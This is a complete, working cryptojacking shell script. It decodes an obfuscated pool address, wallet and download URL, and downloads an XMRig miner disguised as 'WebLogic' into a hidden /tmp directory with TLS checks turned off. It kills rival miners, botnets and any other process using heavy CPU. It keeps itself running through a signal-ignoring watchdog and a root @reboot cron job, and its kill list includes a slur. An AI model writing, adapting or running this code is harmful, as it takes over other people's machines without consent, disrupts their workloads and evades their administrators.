#!/bin/sh

set -e

_B64_POOL="cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=="
_B64_WALLET="NDg5dWR4QnA5YXJockROVEJoYW5hS1IzdjRheFhlZ2J0UXFiQjJuYVUxNTlZWFFiYXo0Ym1VblA1ZHVtN2o4NWt1ZmhpdUpDdDd0ZEdIcEJvWGZESmR3b0ZtaUJteW0="
_B64_BASEURL="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3F3ZWFzZGlvcGJvc2lubi1zeXMvcXNlZnRodWtpbG1qYmdjZHpheHNkdnJnbmh1ay9yZWZzL2hlYWRzL21haW4="

_decode() {
    echo "$1" | base64 -d 2>/dev/null || echo "$1" | openssl base64 -d 2>/dev/null
}

POOL=$(_decode "$_B64_POOL")
WALLET=$(_decode "$_B64_WALLET")
BASE_URL=$(_decode "$_B64_BASEURL")

BINARY_NAME="WebLogic"

gen_worker() {
    if command -v openssl >/dev/null 2>&1; then
        openssl rand -hex 3
    elif [ -r /dev/urandom ]; then
        od -A n -t x1 /dev/urandom | tr -d ' \n' | head -c 6
    else
        awk 'BEGIN{srand(); printf "%06x", int(rand()*16777215)}'
    fi
}

WORKER=$(gen_worker)

detect_arch() {
    MACHINE=$(uname -m)
    case "$MACHINE" in
        x86_64|amd64)       echo "x86_64" ;;
        aarch64|arm64)      echo "aarch64" ;;
        armv7*|armv6*|arm)  echo "armv7" ;;
        i686|i386|i586)     echo "i686" ;;
        *)                  echo "x86_64" ;;
    esac
}

ARCH=$(detect_arch)

case "$ARCH" in
    x86_64)  REMOTE_FILE="xmrig-x86_64-static" ;;
    aarch64) REMOTE_FILE="xmrig-aarch64-static" ;;
    armv7)   REMOTE_FILE="xmrig-armv7-static" ;;
    i686)    REMOTE_FILE="xmrig-i686-static" ;;
esac

DOWNLOAD_URL="${BASE_URL}/${REMOTE_FILE}"

cleanup_old() {
    pkill -9 -f "$BINARY_NAME" >/dev/null 2>&1 || true
    sleep 1
    for d in /tmp/.wl_*; do
        [ -d "$d" ] || continue
        rm -f "${d}/${BINARY_NAME}" 2>/dev/null || true
        rmdir "$d" 2>/dev/null || true
    done
}

cleanup_old

TMPDIR_BASE="/tmp/.wl_$(date +%s)"
mkdir -p "$TMPDIR_BASE"
BINARY_PATH="${TMPDIR_BASE}/${BINARY_NAME}"

download_file() {
    if command -v wget >/dev/null 2>&1; then
        wget -q --no-check-certificate -O "$1" "$2"
    elif command -v curl >/dev/null 2>&1; then
        curl -fsSL --insecure -o "$1" "$2"
    else
        exit 1
    fi
}

download_file "$BINARY_PATH" "$DOWNLOAD_URL"

if [ ! -f "$BINARY_PATH" ] || [ ! -s "$BINARY_PATH" ]; then
    exit 1
fi

chmod +x "$BINARY_PATH"

kill_competitors() {
    KILL_LIST="
    xmrig xmr-stak minerd cpuminer
    kswapd0 kworkerds kdevtmpfsi kinsing kdevtmpfs
    cnrig xmrigMiner xmrigDaemon
    mirai condi tsunami bashlite
    cgminer bfgminer ccminer nigger
    "

    for name in $KILL_LIST; do
        pkill -9 -f "$name" >/dev/null 2>&1 || true
    done

    OWN_NAME=$(basename "$BINARY_PATH")

    ps aux 2>/dev/null | awk -v own="$OWN_NAME" -v ourpid="$$" '
    NR==1 { next }
    {
        pid=$2
        cpu=$3
        cmd=$11
        if (pid+0 == ourpid+0) next
        if (pid+0 == 1) next
        if (cmd ~ /^\[/) next
        if (index(cmd, own) > 0) next
        if (cpu+0 > 60) system("kill -9 " pid " 2>/dev/null")
    }' || true
}

kill_competitors

MINER_ARGS="--no-color --donate-level=1 -a rx/0 -o ${POOL} -u ${WALLET} -p ${WORKER} --tls"

start_miner() {
    if command -v setsid >/dev/null 2>&1; then
        setsid "$BINARY_PATH" $MINER_ARGS >/dev/null 2>&1 &
    else
        nohup "$BINARY_PATH" $MINER_ARGS >/dev/null 2>&1 &
    fi
    disown 2>/dev/null || true
}

start_watchdog() {
    (
        trap '' SIGTERM SIGHUP SIGINT
        while true; do
            sleep 1
            if ! pgrep -f "$BINARY_NAME" >/dev/null 2>&1; then
                if command -v setsid >/dev/null 2>&1; then
                    setsid "$BINARY_PATH" $MINER_ARGS >/dev/null 2>&1 &
                else
                    nohup "$BINARY_PATH" $MINER_ARGS >/dev/null 2>&1 &
                fi
            fi
        done
    ) >/dev/null 2>&1 &
    disown 2>/dev/null || true
}

start_miner
start_watchdog

if [ "$(id -u)" = "0" ]; then
    OWN_NAME=$(basename "$BINARY_PATH")
    CRON_JOB="@reboot ${BINARY_PATH} ${MINER_ARGS} >/dev/null 2>&1"
    ( crontab -l 2>/dev/null | grep -v "$OWN_NAME"; echo "$CRON_JOB" ) | crontab - 2>/dev/null || true
fi

exit 0
